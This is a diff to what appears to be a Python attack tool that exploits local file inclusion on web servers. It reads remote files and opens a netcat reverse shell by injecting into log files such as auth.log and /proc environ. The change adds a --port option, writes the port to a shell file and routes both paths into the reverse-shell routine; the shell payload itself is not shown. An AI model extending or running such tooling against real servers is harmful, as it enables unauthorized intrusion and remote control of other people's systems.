@@ -258,18 +258,28 @@ class Read_File:
                            else:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"\
                                +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('.','',4).replace('/','_'))              
-                           if self.args.shell:
+                           if self.args.shell or self.args.port:
                                 if  "auth" in  self.url or "auth.log" in  self.url\
-                                or "environ" in self.url: 
+                                or "environ" in self.url or self.args.port: 
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
-                                    print("[+] Mothead              : ................ | : enjaction log file  ")
-                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
-                                    print("[+] Lisliner IP          : ................ | :",self.args.shell)   
-                                    print("[+] Lisliner Port        : ................ | : 7777") 
-                                    self.Reverse_shell()
-                                    exit()
+                                    if self.args.port: 
+                                         with open("./Package/shell/.port",'w') as port:
+                                              port.write(self.args.port)
+                                         print("[+] Mothead              : ................ | : read shell file  ")
+                                         print("[+] Lisliner Tool        : ................ | : NETCAT ")
+                                         print("[+] Lisliner Port        : ................ | :",self.args.port) 
+                                         print("[+] Lisliner IP          : ................ | : 0.0.0.0")
+                                         self.Reverse_shell()
+                                         exit()
+                                    else:
+                                        print("[+] Mothead              : ................ | : enjaction log file  ")
+                                        print("[+] Lisliner Tool        : ................ | : NETCAT ")
+                                        print("[+] Lisliner IP          : ................ | :",self.args.shell)   
+                                        print("[+] Lisliner Port        : ................ | : 7777") 
+                                        self.Reverse_shell()
+                                        exit()
                                 else:
                                       print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                       time.sleep(1)
@@ -311,8 +321,8 @@ class Read_File:
            parser.add_argument("-LU","--loginurl"   , action=None                            ,help =" add login url for auth motted") 
            parser.add_argument("-U","--user"        , action=None                            ,help ="use specific username ")
            parser.add_argument("-A","--aggress"     ,action='store_true'                     ,help ="  use aggressiv mode  ")
-           parser.add_argument("-K","--upload"      ,action='store_true'                     ,help ="  use to upload file  to server")
-           parser.add_argument("-D","--Domain"      ,action=None                             ,help ="  use target url domain not as ip 'http://www.anyDomain.com'")
+           parser.add_argument("--port"             ,action=None                             ,help ="  set port for netcat ")
+           parser.add_argument("-D","--Domain"      ,action=None                             ,help ="  use target url domain not as ip 'www.expiln.com'")
            parser.add_argument("-S","--shell"       , action=None                            ,help ="  to connent reverseshell   ")
            self.args = parser.parse_args()          
            if len(sys.argv)!=1 :
@@ -449,7 +459,7 @@ class Read_File:
                    os.remove('./FileStore/'+self.ip_re+'/index.txt')  
                    os.remove('./FileStore/'+self.ip_re+"/"+self.args.read.replace('/','',1).replace('/','X'))
      def Reverse_shell(self):
-                 if not self.args.shell:
+                 if not self.args.shell and not self.args.port :
                     exit()
                  else:   
                    try:
